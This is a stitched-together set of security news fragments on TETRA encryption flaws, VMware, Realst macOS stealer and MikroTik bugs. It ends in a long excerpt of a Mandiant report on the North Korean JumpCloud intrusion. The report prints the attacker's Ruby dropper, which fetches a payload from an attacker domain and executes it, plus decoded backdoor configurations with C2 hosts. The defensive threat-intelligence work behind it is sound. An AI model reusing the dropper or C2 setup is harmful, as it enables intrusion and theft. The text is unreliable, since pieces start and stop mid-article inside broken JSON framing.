      "text": " A radio communications protocol used by emergency services worldwide harbors several critical vulnerabilities that could allow adversaries to spy on or manipulate the transmissions, researchers found.Terrestrial Trunked Radio (TETRA) is a radio voice and data standard mainly used by emergency services, such as police, fire brigade, and military, as well as in some industrial environments.Multiple TETRA secure channels offer key management, voice, and data encryption, while the TETRA Encryption Algorithm (TEA1) implements the actual encryption algorithms that ensure that data is confidentially communicated over the air.Depending on infrastructure and device configurations, these vulnerabilities allow for real-time or delayed decryption, message injection, user deanonymization, or session key pinning attacks. Practically, these vulnerabilities allow high-end adversaries to listen in on police and military communications, track their movements, or manipulate critical infrastructure network communications carried over TETRA.Bokslag admits that using the term backdoor is strong, but it is justified in this instance. \"As you feed an 80 bits key to TEA1, that flows through a reduction step and which leaves it with only 32 bits of key material, and it will carry on doing the decryption with only those 32 bits,\" he says.Bokslag says this weakening of the cipher would allow an attacker to exhaustively search through the 32 bits, and decrypt all the traffic with very cheap hardware. This would only require a $10 USB dongle to receive signals, and using a standard laptop an attacker would have access until the key changes — and in many cases, the key is never changed, so the attacker would have permanent access to communications.Admitting that \"proprietary cryptography has repeatedly suffered from practically exploitable flaws which remain unaddressed until disclosed,\" the researchers said their goal was to open up TETRA for public review, perform a risk analysis, resolve issues, and create a level playing field.The researchers also said the intention was to gain a better understanding of TETRA security, ensure identified issues are resolved and promote the use of open cryptography.\"The interesting thing about this technology is that the use cases which are quite sensitive, and the cryptography that's supposed to secure communications is secret,\" Bokslag says.First published in 1995 by the European Telecommunications Standards Institute (ETSI), TETRA is one of the most widely used professional mobile radio standards — especially for law enforcement — and has been in continuous use for decades for voice, data, and machine-to-machine communications.While most of the TETRA standard is open, its security relies on a set of secret, proprietary cryptographic algorithms that are distributed only under strict nondisclosure agreement to a limited number of parties. The researchers also found a mention of TETRA in the 2013 Edward Snowden leaks, especially in the interception of TETRA communications.Bokslag admits some of the issues quite easily can be resolved through firmware updates, including CVE-2022-24401. However, CVE-2022-24402 is not fixable through firmware updates because they are part of the standard.\"You cannot work around it,\" Bokslag says. \"For TEA1, you could apply end-to-end encryption as a solution, but it's going to be very costly and very labor intensive to roll out.\"Users in more than 100 countries will be affected by these vulnerabilities, as well as most sectors of industry, including law enforcement as well as military and intelligence services, he says. The researchers have been in contact with manufacturers and network operators in order to help them resolve these issues as much as they can. \"This has been the first public in-depth security analysis of TETRA in its existence, which is now almost 30 years,\" he says.\"No one is allowed to know what TEA [versions] 5, 6, and 7 will involve,\" Bokslag adds. \"The authentication mechanisms are once again going to be to be secret. There are not yet any solutions in the market, but manufacturers are working on them.\"Bokslag says manufacturers have developed patches for the vulnerabilities in response to the research. Midnight Blue recommends migrating from TEA1 to another TEA cipher for now.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " VMware has patched an information disclosure vulnerability in VMware Tanzu Application Service for VMs (TAS for VMs) and Isolation Segment caused by credentials being logged and exposed via system audit logs.  TAS for VMs helps enterprises automate the deployment of applications across on-premises or public and private clouds (e.g., vSphere, AWS, Azure, GCP, OpenStack).Tracked as CVE-2023-20891, the security flaw addressed today by Vmware would allow remote attackers with low privileges to access Cloud Foundry API admin credentials on unpatched systems in low-complexity attacks that don't require user interaction.This happens because, on unpatched TAS for VMs instances, hex-encoded CF API admin credentials are logged in platform system audit logs.Threat actors who exploit this vulnerability can use the stolen credentials to push malicious app versions. \"A malicious non-admin user who has access to the platform system audit logs can access hex encoded CF API admin credentials and can push new malicious versions of an application,\" VMware says.Luckily, as highlighted by VMware, non-admin users don't have access to the system audit logs in standard deployment configurations.However, the company still advises all TAS for VMs users affected by CVE-2023-20891 to rotate CF API admin credentials to ensure that attackers can't use any leaked passwords.\"TAS does not officially support changing the UAA admin user's password. The instructions above are not officially tested as a part of the Operations Manager test suite, so use them at your own risk,\" VMware warns.\"It may be tempting to change the admin user's password with the uaac utility. Unfortunately, this is not sufficient because it will only update the admin user's password in UAA. This leaves Operations Manager out of sync and can cause jobs and errands to fail.\""

      "text": " A new Mac malware named \"Realst\" is being used in a massive campaign targeting Apple computers, with some of its latest variants including support for macOS 14 Sonoma, which is still in development.These games are promoted on social media, with the threat actors using direct messages to share access codes required to download the fake game client from associated websites.Access codes allow the threat actors to vet those they wish to target and avoid security researchers who want to reveal malicious behavior.In reality, the game installers infect devices with information-stealing malware, such as RedLine Stealer on Windows and Realst on macOS. This type of malware will steal data from the victim's web browsers and cryptocurrency wallet apps and send them back to the threat actors.SentinelOne analyzed 59 Mach-O samples of the Realst malware found by iamdeadlyz, focusing on its macOS versions, and found several distinct differences.This allowed the researchers to identify 16 variants of the macOS malware, a sign of active and rapid development.When downloading the fake game from the threat actor's site, they will be offered either Windows or macOS malware, depending on their OS.The Windows malware is typically RedLine Stealer, but sometimes other malware like Raccoon Stealer and AsyncRAT.For Mac users, the sites will distribute the Realst info-stealing malware, which targets Mac devices as PKG installers or DMG disk files containing the malicious Mach-O files but no real games or other decoy software.The \"game.py\" file is a cross-platform Firefox infostealer and \"installer.py\" is \"chainbreaker,\" an open-source macOS keychain database password, keys, and certificates extractor.SentinelOne found that some samples are codesigned using valid (now revoked) Apple Developer IDs, or ad-hoc signatures, to bypass detection from security tools.All 16 distinct Realst variants analyzed by SentinelOne are fairly similar in form and function, although they utilize different API call sets.In all cases, the malware targets Firefox, Chrome, Opera, Brave, Vivaldi, and the Telegram app, but none of the analyzed Realst samples target Safari.\"Collected data is dropped in a folder simply named \"data\" [which] may appear in one of several locations depending on the version of the malware: in the user's home folder, in the working directory of the malware, or in a folder named after the parent game.\"The 16 distinct variants are categorized into four main families based on their traits, namely A, B, C, and D.Family B is similar to A and also uses password spoofing but divides the relevant strings into smaller units to evade simple static detection.Family C also has a reference to chainbreaker within the binary itself, which allows it to extract data from the system's keychain database.Finally, Family D uses the Terminal window to prompt the victim to enter their password, which is used to dump saved credentials stored in Keychain.In some cases, Family D leverages the acquired password to gain admin privileges on the system and install the Python cryptography library \"pycryptodome,\" which is also used to dump credentials from the Keychain.Roughly 30% of the samples from families A, B, and D contain strings that target the upcoming macOS 14 Sonoma.The presence of those strings shows that the malware authors are already preparing for Apple's forthcoming desktop OS release, ensuring that Realst will be compatible and working as expected.MacOS users are advised to be cautious with blockchain games, as those distributing Realst use Discord channels and \"verified\" Twitter accounts to create a false image of legitimacy.Furthermore, as these games specifically target cryptocurrency users, the main goal is likely to steal crypto wallets and the funds within them, leading to costly attacks."

      "text": " A critical severity 'Super Admin' privilege elevation flaw puts over 900,000 MikroTik RouterOS routers at risk, potentially enabling attackers to take full control over a device and remain undetected.This is because the Mikrotik RouterOS operating system does not prevent password brute-force attacks and comes with a well-known default \"admin\" user.\"'En masse' exploitation is going to be more difficult since valid credentials are required. However, as I outlined in the blog, the routers lack basic protections against password guessing,\" VulnCheck researcher Jacob Baines told BleepingComputer.\"We intentionally didn't release a proof-of-concept exploit, but if we had, I have no doubt that the exploit would have been successfully used in the wild quickly after the blog was released.\"The Mikrotik CVE-2023-30799 vulnerability was first disclosed without an identifier in June 2022, and MikroTik fixed the issue in October 2022 for RouterOS stable (v6.49.7) and on July 19, 2023, for RouterOS Long-term (v6.49.8).VulnCheck reports that a patch for the Long-term branch was made available only after they contacted the vendor and shared new exploits that targeted MikroTik hardware.The researchers used Shodan to determine the flaw's impact and found that 474,000 devices were vulnerable as they remotely exposed the web-based management page.However, as this vulnerability is also exploitable over Winbox, a Mikrotek management client, Baines found that 926,000 devices were exposing this management port, making the impact far larger.While exploiting this vulnerability requires an existing admin account, it elevates you to a higher privilege level called \"Super Admin.\" Unlike the admin account, which offers restricted elevated privileges, Super Admin gives full access to the RouteOS operating system.\"By escalating to super admin, the attacker can reach a code path that allows them to control the address of a function call,\" Baines told BleepingComputer.\"Super admin is not a privilege given to normal administrators, it's a privilege that is supposed to be given to certain parts of the underlying software (specifically, in this case, to load libraries for the web interface), and not to actual users.This makes the vulnerability valuable to threat actors wishing to \"jailbreak\" the RouterOS device to make significant changes to the underlying operating system or hide their activities from detection.The new exploit developed by VulnCheck bypasses the requirement for FTP interface exposure and is not impacted by blocking or filtering of bindshells, as it uses the RouterOS web interface to upload files.Finally, VulnCheck identified a simplified ROP chain that manipulates the stack pointer and the first argument register and calls dlopen, the instructions for which are present in three functions across different RouterOS versions, ensuring broad applicability.The exploit still requires authentication as \"admin,\" however, VulnCheck explains that RouterOS ships with a fully functional admin user by default, which nearly 60% of MikroTik devices still use despite the vendor's hardening guidance suggesting its deletion.Moreover, the default admin password was an empty string until October 2021, when this issue was fixed with the release of RouterOS 6.49.Finally, RouterOS does not impose admin password strengthening requirements, so users may set anything they like, which makes them susceptible to brute-forcing attacks, for which MikroTik does not offer any protection except on the SSH interface.\"All of this is to say, RouterOS suffers from a variety of issues that make guessing administrative credentials easier than it should be,\" comments VulnCheck\"We believe CVE-2023-30799 is much easier to exploit than the CVSS vector indicates.\""

Attackers could exploit this flaw to trigger an out-of-bounds read, potentially causing denial-of-service attacks by accessing invalid memory addresses.“Based on our analysis, an information disclosure exploit seems implausible,” Fortinet clarified. “However, a denial-of-service attack can be achieved when the out-of-bound read accesses an invalid address.”The second vulnerability occurred due to inadequate validation of message headers with arbitrary sizes. The final vulnerability resulted from a malformed data structure in the CompoundMessage header. Attackers leveraged this vulnerability to trigger an out-of-bounds write, affecting the MSMQ kernel mode component, MQAC.SYS. Memory corruption and code execution were possible consequences.Upon discovering these critical vulnerabilities, FortiGuard Labs promptly informed Microsoft, who responded by releasing security updates in April and July 2023. The company urged users to update their systems promptly to safeguard against potential cyber threats.“We can’t emphasize enough the urgency to apply the latest Microsoft patches to prevent you or your organization from falling victim to a devastating cyber-attack.”"

Some victims have remained in contact with a Decoy Dog server for over a year.“As demonstrated with Decoy Dog, studying and deeply understanding the attacker’s tactics and techniques allows us to block threats before they are even known as malware.”To support further investigation of the malware’s C2 systems, Infoblox has released a new dataset containing DNS traffic captured from their servers.“The lack of insight into underlying victim systems and vulnerabilities being exploited makes Decoy Dog an ongoing and serious threat,” explained Dr. Renée Burton, head of threat intelligence at Infoblox. “The best defense against this malware is DNS. Malicious activity often goes unnoticed because DNS is undervalued as a critical component in the security ecosystem. Only enterprises with a strong protective DNS strategy can protect themselves from these types of hidden threats.” Burton added.Infoblox researchers will also provide hands-on challenges using a live Pupy controller at their booth, demonstrating how DNS traffic is exploited to relay communications between clients and servers."

We believe the compromise ultimately began as a result of a sophisticated spear phishing campaign aimed at JumpCloud, a zero-trust directory platform service used for identity and access management. JumpCloud reported this unauthorized access impacted fewer than five customers and less than 10 devices.The details in this blog post are based on Mandiant’s investigation into the attack against one of JumpCloud’s impacted customers.Evidence of compromise was observed within the JumpCloud agent log located at the file path /private/var/log/jcagent.log.Mandiant observed log entries in jcagent.log that indicated a directive named “Runworkflow” triggered execution on the system:time=2023-06-27 18:51:57.415615-07:00 PID=82291 level=warning msg=Fallback Poll was required to handle the following directive: RunWorkflow time=2023-06-27 18:51:57.416036-07:00 PID=82291 level=info msg=policies manager received a request to update workflow policies time=2023-06-27 18:51:57.416145-07:00 PID=82291 level=info msg=removeWorkflowPolicies - Removing isExecuteOnGUILogin workflow policies time=2023-06-27 18:51:57.416192-07:00 PID=82291 level=info msg=updateWorkflowPolicies - Adding all current workflow policies time=2023-06-27 18:51:57.416238-07:00 PID=82291 level=info msg=Processing TypeScheduleCron time=2023-06-27 18:51:57.416308-07:00 PID=82291 level=info msg=Policy manager creating schedule cron monitor ID=<ID>  name=Workflow schedule=immediate type=WORKFLOW time=2023-06-27 18:51:57.416550-07:00 PID=82291 level=info msg=policies manager received a request to apply Workflow policyDuring the investigation, Mandiant observed the threat actor target four (4) OSX Ventura systems running either versions 13.3 or 13.4.1. During the forensic analysis of these systems, Mandiant identified a relatively new forensic artifact that proved extremely valuable to the investigation.This forensic artifact is related to Apple’s XProtect services, specifically, the XProtect Behavioral Service. There are currently five behavioral-based rules defined by Apple. Information about executed programs that violate one or more of these rules is recorded in the XProtect Database (XPdb), which is stored in SQLite 3 format and located at /var/protected/xprotect/XPdb. At this time, it does not appear that the XProtect Behavioral Service is configured to block execution.Through analysis of data stored in the XPdb, Mandiant identified entries containing specific signing identifiers that correlated to attacker payloads. Specifically, the exec_signing_id field within the XPdb contains information about the signature of the binary, which can be used to help identify the author of a particular signed binary. Mandiant identified three unique signatures associated with malicious files: Mandiant used these signatures to search the XPdb for additional attacker payloads that were deleted by the threat actor or otherwise unable to be identified through other forms of analysis.An additional field of interest in the XPdb was the exec_cdhash, which contains the cdhash, or Code Directory hash, of the executed binaries. Mandiant identified the historical execution of malicious binaries across multiple systems using cdhash values stored in the XPdb. Because the cdhash is computed based on executable code in the application, Mandiant was able to identify additional malware in the environment despite the files being deleted by the threat actor and the samples having different file hashes.Further fields of interest in the XPdb had the prefix “responsible_” and contained information about the parent of the process which violated the behavioral rules. On multiple systems, XPdb entries for the malware contained the parent process of the JumpCloud agent, further evidence that the threat actor leveraged JumpCloud to gain initial access to victim environments.The threat actor was consistently observed removing prior payloads from disk; however, the FSEvents artifacts were able to provide great insight into files that previously existed on disk. The FSEvents contained details on the creation, modification, permission changes, renaming, and removal of files, even if the filesystem no longer contained artifacts indicating the existence of these files remained. Using the node_id field associated with individual entries, Mandiant was able to identify the order of specific threat actor activities on systems and the updated names of renamed files.  The following table provides an example of the relevant data obtained from FSEvents:node_idfullpathDescription53789510/Library/Ruby/Gems/2.6.0/extensions/init.rbRuby script53789519/usr/local/bin/com.docker.vmnatFULLHOUSE.DOORED53789522/usr/local/bin/com.docker.vmnat.lockNot recovered54101444/Library/Fonts/ArialUnicode.ttf.md5STRATOFEAR (Config)54102142/Library/PrivilegedHelperTools/com.microsoft.teams.TeamsDaemonSTRATOFEAR54102142/Library/PrivilegedHelperTools/us.zoom.ZoomServiceSTRATOFEAR54102303/Library/LaunchDaemons/com.microsoft.teams.TeamsDaemon.plistSTRATOFEAR (LaunchDaemon)54212385/Library/LaunchDaemons/us.zoom.ZoomService.plistSTRATOFEAR (LaunchDaemon)Initial access was gained by compromising JumpCloud and inserting malicious code into their commands framework. In at least one instance, the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent. The script contained instructions to download and execute a second stage payload. Within 24 hours of gaining initial access to systems in the victim environment, the threat actor deployed additional backdoors and established persistence via plists. The initial payloads and second stage backdoors were removed from the system. The directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading as legitimate files and applications. Mandiant retrieved the lightweight Ruby script named init.rb that was deployed to multiple systems:require 'open-uri'ffn = '/usr/local/bin/com.docker.vmnat' File.open(ffn, 'wb') do |file|file.write(open('hxxps://primerosauxiliosperu[.]com/lic.dat').read)endsleep(1)File.chmod(0755, ffn)fn = '/usr/local/bin/com.docker.vmnat.lock' File.open(fn, 'wb') do |file|file.write(open('hxxps://primerosauxiliosperu[.]com/lic_bak.dat').read)endsleep(1)system(ffn)The script downloads two files to locations defined by the variables ffn and fn, but only the first file is executed via the system function. The second file could not be identified on the hosts.The threat actor downloaded and executed /usr/local/bin/com.docker.vmnat using the aforementioned Ruby script. However, com.docker.vmnat was removed from the system. Fortunately, an artifact of its execution was discovered in the /private/var/db/oah directory. FULLHOUSE.DOORED is a backdoor written in C/C++ that communicates using HTTP. It incorporates the capabilities of the FULLHOUSE tunneler in addition to supporting backdoor commands including shell command execution, file transfer, file management, and process injection. The command and control (C2) server must be configured from either the command line or a configuration file.Additional attacker backdoors identified on systems with names that masquaraded as legitimate binaries and also produced AOT files upon translation (e.g., npx-cli and npx-cli.aot).Limited forensic evidence existed to determine exactly how STRATOFEAR was deployed to systems in the victim environment; however, in each instance, STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED. On the systems analyzed, only one backdoor remained on the system, indicating the threat actor may have used FULLHOUSE.DOORED as a first-stage backdoor before deploying STRATOFEAR as a second-stage backdoor.STRATOFEAR is a modular backdoor that communicates with C2 servers using a protocol specified in its C2 configuration, which is decrypted from a local file. The backdoor’s primary functionality involves retrieving and executing additional modules. Modules may be downloaded from a remote server or loaded from disk. STRATOFEAR contains an embedded configuration that includes two file paths. The first path (/Library/Fonts/ArialUnicode.ttf.md5) stores the backdoor’s full configuration, including its C2 servers. The second path (/Library/Fonts/ArialUnicode.ttf.md5.1) may be used to store logging information related to monitor activity that is described as follows.A portion of STRATOFEAR’s 0x1052-byte decrypted configuration is shown as follows.00000410  25 63 01 00 00 00 E8 03 00 00 03 00 00 00 02 00  %c....è.........00000420  00 00 65 6D 62 65 64 3A 2F 2F 30 00 00 00 00 00  ..embed://0.....00000430  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000440  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000450  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000460  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000470  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000480  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000490  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000004F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000500  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000510  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000520  00 00 00 00 00 00 70 73 73 6C 3A 2F 2F 63 6F 6E  ......pssl://con00000530  74 6F 72 74 6F 6E 73 65 74 2E 63 6F 6D 3A 34 34  tortonset.com:4400000540  33 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  3...............00000550  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000590  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000005F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000620  00 00 00 00 00 00 00 00 00 00 70 73 73 6C 3A 2F  ..........pssl:/00000630  2F 72 65 6C 79 73 75 64 64 65 6E 2E 63 6F 6D 3A  /relysudden.com:00000640  34 34 33 00 00 00 00 00 00 00 00 00 00 00 00 00  443.............STRATOFEAR refers to the four-byte value at offset 0x410 (0x16325) as a uid. The four-byte value at offset 0x416 (0x3e8 or decimal 1000) is the backdoor’s version number. STRATOFEAR’s configuration file may include AES-128-encrypted modules; however, this was not the case in the discovered sample.A subset of commands supported by STRATOFEAR are listed in the following table:Command IDDescription0x02Start the primary module thread (see the following module command table)0x07Collect system information, module information, and configuration data0x08Read and decrypt the local configuration file0x09Write the in-memory configuration to the local configuration file0x0ADelete the local configuration file0x0BGet the path of the local configuration file0x0CRetrieve the in-memory configurationSystem information collected using command 0x07 includes the system name, current username, and the system’s architecture.STRATOFEAR supports the module-related commands listed in the following table:Command IDDescription0x60Not implemented0x61Retrieve module information: name, ID, version, memory address0x62Load module from memory or disk and execute its Initialize function0x63Invoke module by ID0x64Retrieve module execution result0x65Retrieve module start and end values0x66Change directoryDownloaded modules may be written to a .tmp file in the $TMPDIR or /tmp directory. The file’s name consists of six randomly-generated alphanumeric characters.STRATOFEAR’s code references five predefined module types that have an ID value and an internal name:Module IDInternal Name1module_ipc2module_monitor3module_apu4module_event5module_netSTRATOFEAR also contains strings that are used to report a module’s location. Possible locations are  “Config”, “Static”, or “Path” followed by a file path.STRATOFEAR  employs what it refers to as “monitors” to monitor system activity using up to 16 threads. The backdoor references eight different monitors and includes descriptions for all but one (0x45).Monitor IDInternal Description0x42\"monitor for when file(%s) is created\"0x43\"monitor for when size of file(%s) is changed\"0x44\"monitor for when status of network connection(%s:%d => %s:%d) is created\"0x45None.

TIEDYE can communicate with a C2 server using a range of supported protocols described as follows. Its capabilities include retrieving and executing additional payloads, collecting basic system information, and executing shell commands.A portion of TIEDYE’s raw configuration is shown as follows:00000000  00 00 01 E3 00 0E 00 1E 00 00 00 04 00 03 00 20  ...ã........... 00000010  00 10 56 E6 00 00 00 04 00 03 00 21 00 00 00 05  ..Væ.......!....00000020  00 00 00 7D 00 0D 00 33 00 00 00 37 00 0E 00 00  ...}...3...7....00000030  00 00 00 17 00 0C 00 34 73 73 6C 3A 2F 2F 62 61  .......4ssl://ba00000040  73 6B 65 74 73 61 6C 75 74 65 2E 63 6F 6D 00 00  sketsalute.com..00000050  00 00 04 00 03 00 35 00 00 00 00 00 00 00 04 00  ......5.........00000060  03 00 36 00 00 00 00 00 00 00 36 00 0E 00 00 00  ..6.......6.....00000070  00 00 16 00 0C 00 34 73 73 6C 3A 2F 2F 72 65 6E  ......4ssl://ren00000080  74 65 64 70 75 73 68 79 2E 63 6F 6D 00 00 00 00  tedpushy.com....00000090  04 00 03 00 35 00 00 00 00 00 00 00 04 00 03 00  ....5...........000000A0  36 00 00 00 00 00 00 00 04 00 03 00 23 00 00 00  6...........#...000000B0  0A 00 00 01 08 00 0D 00 24 00 00 00 24 00 0E 00  ........$...$...000000C0  00 00 00 00 04 00 03 00 25 00 00 03 E8 00 00 00  ........%...è...000000D0  04 00 03 00 26 00 00 00 00 00 00 00 04 00 03 00  ....&...........000000E0  27 00 00 00 00 00 00 00 24 00 0E 00 00 00 00 00  '.......$.......000000F0  04 00 03 00 25 00 00 03 E9 00 00 00 04 00 03 00  ....%...é.......00000100  26 00 00 00 00 00 00 00 04 00 03 00 27 00 00 00  &...........'...00000110  00 00 00 00 24 00 0E 00 00 00 00 00 04 00 03 00  ....$...........00000120  25 00 00 03 EA 00 00 00 04 00 03 00 26 00 00 00  %...ê.......&...00000130  00 00 00 00 04 00 03 00 27 00 00 00 00 00 00 00  ........'.......00000140  24 00 0E 00 00 00 00 00 04 00 03 00 25 00 00 03  $...........%...00000150  ED 00 00 00 04 00 03 00 26 00 00 00 00 00 00 00  í.......&.......00000160  04 00 03 00 27 00 00 00 00 00 00 00 24 00 0E 00  ....'.......$...00000170  00 00 00 00 04 00 03 00 25 00 00 00 00 00 00 00  ........%.......00000180  04 00 03 00 26 00 00 00 00 00 00 00 04 00 03 00  ....&...........00000190  27 00 00 00 00 00 00 00 24 00 0E 00 00 00 00 00  '.......$.......000001A0  04 00 03 00 25 00 00 00 00 00 00 00 04 00 03 00  ....%...........000001B0  26 00 00 00 00 00 00 00 04 00 03 00 27 00 00 00  &...........'...000001C0  00 00 00 00 22 00 0C 00 37 2F 4C 69 62 72 61 72  ....\"...7/Librar000001D0  79 2F 43 61 63 68 65 73 2F 63 6F 6D 2E 61 70 70  y/Caches/com.app000001E0  6C 65 2E 70 72 69 76 61 63 79 00 05 05 05 05 05  le.privacy......The configuration contains two C2 servers that are prefixed with a protocol identifier. TIEDYE supports the following protocols: tcp, tcp6, udp, upd6, http, https, proxy_socks4, proxy_socks4a, pipe, ssl, ssl3, and rdp. The file path at the end of the configuration is used to store configuration data that is encrypted using AES-128. Previous versions of TIEDYE were configured to persist via a LaunchAgent. The current version contains the functionality to create a LaunchAgent at one of the following locations but is not configured to do so:TIEDYE has similarities to RABBITHUNT, which is a backdoor written in C++ that communicates via a custom binary protocol over TCP. RABBITHUNT's core functionality is implemented through modules downloaded directly into memory or read from a local file. Capabilities added via modules include reverse shell, file transfer, process creation, and process termination.Mandiant identified UNC4899 targeting MacOS keychains and reconnaissance data associated with executives and internal security teams. UNC4899 targeting overlaps with a separate RGB-aligned group, APT43, who in July, 2023 displayed interest in the cryptocurrency vertical, specifically targeting a variety of C-Suite executives from multiple fintech and cryptocurrency companies in the United States, South Korea, Hong Kong, and Singapore. Many of the individuals work at organizations related to financial services, cryptocurrency, blockchain, web3 and related entities. The overlaps in targeting and sharing of infrastructure amongst DPRK groups highlights the continued targeting and coordinated interest in the cryptocurrency field.Mandiant has observed RGB units utilize a series of Operational Relay Boxes (ORBs) using L2TP IPsec tunnels along with commercial VPN providers to obscure their source address. These relays seem to be heavily shared among units under the RGB umbrella.Mandiant observed UNC4899 utilize various VPN providers as a final hop, the most common being ExpressVPN, but connections to NordVPN, TorGuard and many other providers have also been observed. There have been many occasions in which DPRK threat actors did not employ this last hop, or mistakenly did not utilize this while conducting actions on operations on the victim's network.The VPNs used by RGB actors occasionally fail, which reveals the IP addresses of the actor's true origins. Mandiant observed the DPRK threat actor UNC4899 connecting directly to an attacker-controlled ORB from their 175.45.178[.]0/24 subnet. (Ryugyong Dong, Pyongyang). Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived. Figure 2 provides an overview of the network infrastructure used in this campaign.Additionally, Mandiant was able to uncover additional infrastructure due to the fact that a PTR record was never changed from a previous operation. Mandiant has previously identified the domain wasxxv[.]site being used by North Korean threat actors. Additionally, the IP address 198.244.135[.]250 is being utilized for another C2 domain prontoposer[.]com while still having a PTR record to the domain previously identified.Mandiant is tracking this activity as UNC4899, a suspected North Korean actor. We assess with high confidence that UNC4899 is a cryptocurrency-focused group that falls under the RGB. UNC4899's targeting is selective, and they have been observed gaining access to victim networks through JumpCloud. Mandiant has observed overlap amongst multiple North Korean groups that fall under the RGB. These groups commonly share infrastructure to complete their actions on objectives. Mandiant has observed UNC2970, APT43, and UNC4899 all utilize similar infrastructure.Mandiant has observed an increase in financially motivated operations by DPRK actors in the past year, particularly those focused on the cryptocurrency industry. RGB-aligned crypto-focused groups, publicly reported under the umbrella term Lazarus, and clear variants of historic, established APT threat actors such as the open source “TraderTraitor” and “AppleJeus”, have increasingly conducted financially motivated operations that have affected the cryptocurrency industry and various blockchain platforms. Mandiant assesses that DPRK’s cyber landscape has evolved to a streamlined alignment with shared tooling and targeting efforts. Operators within these units quickly change their current focus and begin working on separate unrelated efforts such as ransomware, weapons and nuclear targeting, cryptocurrency efforts, etc. This seeming “streamlining” of activities by DPRK often makes it difficult for defenders to track, attribute, and thwart malicious activities, while enabling this now collaborative adversary to move stealthily and with greater speed. The level of shared targeting and tooling leads Mandiant to believe that shifts are continuing to occur even outside of the heavily RGB dominated cyber landscape. Beyond the listed authors are many Mandiant professionals whom we would like to thank for their continued effort and dedication in working with our clients to respond to DPRK related intrusions. We also want to specifically thank Google’s Threat Analysis Group (TAG), Mandiant’s DPRK Fusion Cell, and our government partners for their continued collaboration and support. We would also like to thank Trellix for our continued partnership and for providing supporting detection YARA rules and associated indicators. IP AddressASNNetblockLocation146.19.173.125213373IP Connect IncSeychelles23.227.202.5429802HIVELOCITY, Inc.Tampa, FL, US38.132.124.889009M247 EuropeSecaucus, NJ, US88.119.174.14861272BaCloudLithuania198.244.135.25016276OVHUnited Kingdom (GB)Domaincontortonset[.]comrelysudden[.]comprimerosauxiliosperu[.]comrentedpushy[.]combasketsalute[.]comprontoposer[.]comMD5SHA256FilenameDescription65baa3c1a22052fe1f70c9d2cbe11de4a8b1c5eb2254e1a3cec397576ef42da038600b4fa7cd1ab66472d8012baabf17init.rbRuby script launched via JumpCloud agent155597a7985cb8f7a6e748e5e108f63708607faad41009e31c094539b20b615b3e7a71e716f2bca12e4a097f38f14466com.docker.vmnat.aotFULLHOUSE.DOORED (AOT Translation)N/A5701d7bcf809d5ffc9061daeb24d3e7cc6585d9b42bacf94fc68a6c500542f8ccom.docker.vmnatFULLHOUSE.DOOREDN/A5701d7bcf809d5ffc9061daeb24d3e7cc6585d9b42bacf94fc68a6c500542f8cNpx-cliFULLHOUSE.DOOREDN/A28c3d359364bf5d64a864f08d4743ea08e48017be27fda8cf53fb5ba307583b4us.Zoom.ZoomUpdateFULLHOUSE.DOORED39a421ea89035ffcc3dea0cd0f10964ee901d9279d8f2ad96d741e7cd92770c0ce3ff3f4c029dbf26177b4e09228fe66ArialUnicode.ttf.md5STRATOFEAR encrypted configuration N/AN/Acom.google.keystone.agent.plistSTRATOFEAR LaunchDaemonN/AN/Acom.google.keystone.service.plistSTRATOFEAR LaunchDaemonN/AN/Acom.microsoft.teams.TeamsDaemon.plistSTRATOFEAR LaunchDaemon27db0f17282a4c4507266f3c4d9c452788f23c22a7f9da8b5087a3fa9c76fd5c79903d89ceda4152943cadc0797cbcb8us.zoom.ZoomService.plistSTRATOFEAR LaunchDaemon6d8194c003d0025fa92fbcbf2eadb6d1a90561efc22bdd777956cc67d5b67e3ec3c1b4f35a64f4328e40615d2ab24186com.google.kserviceSTRATOFEAR backdoor (Mach-O ARM64)6d8194c003d0025fa92fbcbf2eadb6d1a90561efc22bdd777956cc67d5b67e3ec3c1b4f35a64f4328e40615d2ab24186com.microsoft.teams.TeamsDaemonSTRATOFEAR backdoor (Mach-O 